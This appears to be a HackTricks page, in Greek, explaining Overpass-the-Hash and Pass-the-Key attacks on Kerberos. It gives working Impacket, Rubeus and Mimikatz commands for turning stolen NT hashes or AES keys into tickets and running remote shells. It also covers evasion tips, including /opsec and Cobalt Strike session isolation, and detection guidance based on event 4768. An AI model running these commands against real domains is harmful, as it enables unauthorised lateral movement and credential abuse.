# Over Pass the Hash/Pass the Key

{{#include ../../banners/hacktricks-training.md}}


## Overpass The Hash/Pass The Key (PTK)

Η επίθεση **Overpass The Hash/Pass The Key (PTK)** έχει σχεδιαστεί για περιβάλλοντα όπου το παραδοσιακό πρωτόκολλο NTLM είναι περιορισμένο και η Kerberos authentication έχει προτεραιότητα. Αυτή η επίθεση αξιοποιεί το NTLM hash ή τα AES keys ενός χρήστη για να ζητήσει Kerberos tickets, επιτρέποντας μη εξουσιοδοτημένη πρόσβαση σε resources μέσα σε ένα network.

Αυστηρά μιλώντας:

- **Over-Pass-the-Hash** συνήθως σημαίνει μετατροπή του **NT hash** σε Kerberos TGT μέσω του **RC4-HMAC** Kerberos key.
- **Pass-the-Key** είναι η πιο γενική εκδοχή όπου ήδη έχεις ένα Kerberos key όπως **AES128/AES256** και ζητάς ένα TGT απευθείας με αυτό.

Αυτή η διαφορά έχει σημασία σε hardened environments: αν το **RC4 είναι disabled** ή δεν θεωρείται πλέον δεδομένο από το KDC, το **NT hash μόνο του δεν αρκεί** και χρειάζεσαι ένα **AES key** (ή το cleartext password για να το παραγάγεις).

Για να εκτελέσεις αυτή την επίθεση, το αρχικό βήμα περιλαμβάνει την απόκτηση του NTLM hash ή του password του account του στοχευμένου χρήστη. Αφού εξασφαλιστεί αυτή η πληροφορία, μπορεί να ληφθεί ένα Ticket Granting Ticket (TGT) για το account, επιτρέποντας στον attacker να αποκτήσει πρόσβαση σε services ή machines στα οποία ο χρήστης έχει permissions.

Η διαδικασία μπορεί να ξεκινήσει με τις ακόλουθες commands:
```bash
python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```
Για σενάρια που απαιτούν AES256, μπορεί να χρησιμοποιηθεί η επιλογή `-aesKey [AES key]`:
```bash
python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -aesKey <AES256_HEX>
export KRB5CCNAME=velociraptor.ccache
python wmiexec.py -k -no-pass jurassic.park/velociraptor@labwws02.jurassic.park
```
`getTGT.py` επίσης υποστηρίζει την αίτηση ενός **service ticket απευθείας μέσω ενός AS-REQ** με `-service <SPN>`, κάτι που μπορεί να είναι χρήσιμο όταν θέλεις ένα ticket για ένα συγκεκριμένο SPN χωρίς ένα επιπλέον TGS-REQ:
```bash
python getTGT.py -dc-ip 10.10.10.10 -aesKey <AES256_HEX> -service cifs/labwws02.jurassic.park jurassic.park/velociraptor
```
Επιπλέον, το αποκτηθέν ticket μπορεί να χρησιμοποιηθεί με διάφορα tools, συμπεριλαμβανομένων των `smbexec.py` ή `wmiexec.py`, διευρύνοντας το scope της επίθεσης.

Προβλήματα όπως _PyAsn1Error_ ή _KDC cannot find the name_ συνήθως επιλύονται με ενημέρωση της βιβλιοθήκης Impacket ή με χρήση του hostname αντί της IP address, διασφαλίζοντας συμβατότητα με το Kerberos KDC.

Μια εναλλακτική ακολουθία εντολών χρησιμοποιώντας Rubeus.exe δείχνει μια άλλη πτυχή αυτής της technique:
```bash
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```
Αυτή η μέθοδος αντικατοπτρίζει την προσέγγιση **Pass the Key**, με έμφαση στην κατάληψη και την άμεση αξιοποίηση του ticket για σκοπούς authentication. Στην πράξη:

- `Rubeus asktgt` στέλνει το **raw Kerberos AS-REQ/AS-REP** το ίδιο και **δεν** χρειάζεται δικαιώματα admin, εκτός αν θέλεις να στοχεύσεις άλλο logon session με `/luid` ή να δημιουργήσεις ένα ξεχωριστό με `/createnetonly`.
- `mimikatz sekurlsa::pth` κάνει patching του credential material σε ένα logon session και επομένως **αγγίζει το LSASS**, κάτι που συνήθως απαιτεί local admin ή `SYSTEM` και είναι πιο noisy από την οπτική ενός EDR.

Παραδείγματα με Mimikatz:
```bash
sekurlsa::pth /user:velociraptor /domain:jurassic.park /ntlm:2a3de7fe356ee524cc9f3d579f2e0aa7 /run:cmd.exe
sekurlsa::pth /user:velociraptor /domain:jurassic.park /aes256:<AES256_HEX> /run:cmd.exe
```
Για να συμμορφωθείτε με το operational security και να χρησιμοποιήσετε AES256, μπορεί να εφαρμοστεί η ακόλουθη εντολή:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
```
`/opsec` είναι relevant επειδή το traffic που δημιουργεί το Rubeus διαφέρει λίγο από το native Windows Kerberos. Επίσης, σημείωσε ότι το `/opsec` προορίζεται για **AES256** traffic· η χρήση του με RC4 συνήθως απαιτεί `/force`, κάτι που ακυρώνει μεγάλο μέρος του σκοπού, επειδή το **RC4 σε σύγχρονα domains είναι από μόνο του ισχυρό signal**.

## Detection notes

Κάθε TGT request δημιουργεί **event `4768`** στο DC. Στα τρέχοντα Windows builds αυτό το event περιέχει πιο χρήσιμα fields από ό,τι αναφέρουν παλαιότερα writeups:

- `TicketEncryptionType` δείχνει ποιο enctype χρησιμοποιήθηκε για το issued TGT. Τυπικές τιμές είναι `0x17` για **RC4-HMAC**, `0x11` για **AES128**, και `0x12` για **AES256**.
- Τα updated events εκθέτουν επίσης `SessionKeyEncryptionType`, `PreAuthEncryptionType`, και τα advertised enctypes του client, κάτι που βοηθά να ξεχωρίσεις την **πραγματική εξάρτηση από RC4** από τα μπερδεμένα legacy defaults.
- Το να βλέπεις `0x17` σε ένα σύγχρονο environment είναι καλό clue ότι το account, το host ή το KDC fallback path εξακολουθεί να επιτρέπει RC4 και είναι επομένως πιο φιλικό προς το NT-hash-based Over-Pass-the-Hash.

Η Microsoft έχει σταδιακά μειώσει τη συμπεριφορά RC4-by-default από τα November 2022 Kerberos hardening updates, και η τρέχουσα δημοσιευμένη guidance είναι να **αφαιρεθεί το RC4 ως default assumed enctype για AD DCs μέχρι το τέλος του Q2 2026**. Από offensive perspective, αυτό σημαίνει ότι το **Pass-the-Key με AES** είναι όλο και περισσότερο η αξιόπιστη διαδρομή, ενώ το κλασικό **NT-hash-only OpTH** θα συνεχίσει να αποτυγχάνει συχνότερα σε hardened estates.

Για περισσότερες λεπτομέρειες σχετικά με Kerberos encryption types και related ticketing behaviour, δες:

{{#ref}}
kerberos-authentication.md
{{#endref}}

## Stealthier version

> [!WARNING]
> Κάθε logon session μπορεί να έχει μόνο ένα active TGT τη φορά, οπότε πρόσεχε.

1. Δημιούργησε ένα νέο logon session με **`make_token`** από Cobalt Strike.
2. Έπειτα, χρησιμοποίησε το Rubeus για να δημιουργήσεις ένα TGT για το νέο logon session χωρίς να επηρεάσεις το υπάρχον.

Μπορείς να πετύχεις παρόμοιο isolation από το ίδιο το Rubeus με ένα sacrificial **logon type 9** session:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES256_HEX> /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
Αυτό αποφεύγει την αντικατάσταση του τρέχοντος session TGT και συνήθως είναι ασφαλέστερο από το να εισάγετε το ticket στο υπάρχον logon session σας.


## References

- [https://www.tarlogic.com/es/blog/como-atacar-kerberos/](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)
- [https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)


{{#include ../../banners/hacktricks-training.md}}
